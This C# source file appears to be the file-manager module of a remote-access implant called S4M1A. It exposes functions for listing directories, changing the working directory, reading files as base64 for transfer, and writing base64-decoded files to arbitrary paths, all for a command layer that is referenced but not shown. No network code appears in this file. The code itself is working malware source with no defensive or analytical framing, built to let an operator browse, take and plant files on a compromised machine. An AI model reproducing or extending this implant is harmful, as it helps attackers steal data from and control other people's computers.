using System;
using System.IO;
using System.Text;
using S4M1A.Implant; // JsonUtil (defined in Commands.cs)

namespace S4M1A.Implant.Modules
{
    // =====================================================================
    //  S4M1A FileManager v2.0 - file listing / read / write primitives
    //
    //  Contract (used by Commands.cs):
    //    FileManager.List(path)      -> JSON array of entries | "ERR: ..."
    //    FileManager.ReadB64(path)   -> base64 file content   | "ERR: ..."
    //    FileManager.Cd(path)        -> new working dir       | "ERR: ..."
    //    FileManager.ReadText(path)  -> UTF-8 text content    | "ERR: ..."
    //    FileManager.WriteB64(p,b64) -> true | false
    //
    //  List() entry format: {"t":"d|f","n":"name","s":size,"m":"utc mtime"}
    //  "~" is expanded to the user profile. Files > 64 MB are refused here;
    //  large transfers are chunked at Command level (per-chunk checksums).
    // =====================================================================

    public static class FileManager
    {
        private const long MaxReadBytes = 64L * 1024 * 1024;

        public static string List(string path)
        {
            try
            {
                path = Expand(path);
                if (string.IsNullOrEmpty(path)) path = Environment.CurrentDirectory;
                if (Directory.Exists(path))
                {
                    StringBuilder sb = new StringBuilder();
                    sb.Append('[');
                    bool first = true;

                    foreach (string dir in Directory.EnumerateDirectories(path))
                    {
                        if (!first) sb.Append(',');
                        first = false;
                        AddEntry(sb, "d", Path.GetFileName(dir), 0,
                                 Directory.GetLastWriteTimeUtc(dir));
                    }
                    foreach (string file in Directory.EnumerateFiles(path))
                    {
                        try
                        {
                            FileInfo fi = new FileInfo(file);
                            if (!first) sb.Append(',');
                            first = false;
                            AddEntry(sb, "f", fi.Name, fi.Length, fi.LastWriteTimeUtc);
                        }
                        catch { }
                    }
                    sb.Append(']');
                    return sb.ToString();
                }

                if (File.Exists(path))
                {
                    FileInfo fi = new FileInfo(path);
                    StringBuilder sb = new StringBuilder();
                    sb.Append('[');
                    AddEntry(sb, "f", fi.Name, fi.Length, fi.LastWriteTimeUtc);
                    sb.Append(']');
                    return sb.ToString();
                }

                return "ERR: path not found";
            }
            catch (Exception ex)
            {
                return "ERR: " + ex.Message;
            }
        }

        public static string ReadB64(string path)
        {
            try
            {
                path = Expand(path);
                FileInfo fi = new FileInfo(path);
                if (!fi.Exists) return "ERR: file not found";
                if (fi.Length > MaxReadBytes)
                    return "ERR: file too large for single transfer";
                byte[] data = File.ReadAllBytes(path);
                return Convert.ToBase64String(data);
            }
            catch (Exception ex)
            {
                return "ERR: " + ex.Message;
            }
        }

        public static string Cd(string path)
        {
            try
            {
                if (string.IsNullOrEmpty(path)) return "ERR: usage: cd <dir>";
                path = Expand(path);
                if (!Directory.Exists(path)) return "ERR: directory not found";
                Environment.CurrentDirectory = Path.GetFullPath(path);
                return Environment.CurrentDirectory;
            }
            catch (Exception ex)
            {
                return "ERR: " + ex.Message;
            }
        }

        public static string ReadText(string path)
        {
            try
            {
                path = Expand(path);
                FileInfo fi = new FileInfo(path);
                if (!fi.Exists) return "ERR: file not found";
                if (fi.Length > MaxReadBytes)
                    return "ERR: file too large for single transfer";
                return File.ReadAllText(path, Encoding.UTF8);
            }
            catch (Exception ex)
            {
                return "ERR: " + ex.Message;
            }
        }

        public static bool WriteB64(string path, string b64)
        {
            try
            {
                path = Expand(path);
                byte[] data = Convert.FromBase64String(b64 ?? "");
                string full = Path.GetFullPath(path);
                string dir = Path.GetDirectoryName(full);
                if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
                    Directory.CreateDirectory(dir);
                File.WriteAllBytes(full, data);
                return true;
            }
            catch
            {
                return false;
            }
        }

        // ---------------- helpers ----------------

        private static void AddEntry(StringBuilder sb, string t, string name,
                                     long size, DateTime utc)
        {
            sb.Append("{\"t\":\"").Append(t)
              .Append("\",\"n\":\"").Append(JsonUtil.Escape(name))
              .Append("\",\"s\":").Append(size)
              .Append(",\"m\":\"").Append(utc.ToString("yyyy-MM-dd HH:mm:ss"))
              .Append("\"}");
        }

        private static string Expand(string path)
        {
            if (string.IsNullOrEmpty(path)) return path;
            if (path == "~")
                return Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            if (path.StartsWith("~/") || path.StartsWith("~\\"))
                return Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    path.Substring(2));
            return path;
        }
    }
}